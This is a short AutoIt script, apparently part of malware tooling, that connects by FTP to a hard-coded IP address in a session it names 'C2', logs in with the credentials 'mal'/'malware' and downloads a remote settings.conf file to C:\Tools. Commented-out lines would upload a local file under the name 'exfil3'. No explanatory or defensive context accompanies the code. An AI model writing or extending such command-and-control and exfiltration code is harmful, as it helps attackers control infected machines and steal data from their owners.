#include <FTPEx.au3>
#include <Array.au3>

$server = "52.10.100.68"
$file = "settings.conf"

$open = _FTP_Open("C2")
$conn = _FTP_Connect($open, $server, "mal", "malware", "","21")
;$set = _FTP_DirSetCurrent($conn, "/up/")
;$pwd = _FTP_DirGetCurrent($conn)
;$drop = _FTP_FilePut($conn, $file, "exfil3")

;$check = _FTP_FindFileFirst

;$set = _FTP_DirSetCurrent($conn, "/up")

$set = _FTP_DirGetCurrent($conn)

;$fo = _FTP_FileOpen($conn, $file)

;$get = _FTP_FileRead($fo, 105)

;$get = BinaryToString($get)

;$get = StringSplit($get, @CRLF)

;_ArrayDisplay($get)

$get = _FTP_FileGet($conn, "/home/mal/" & $file, "C:\Tools\settings.conf")

ConsoleWrite($open & " " & $conn & " " & $get & @CRLF)

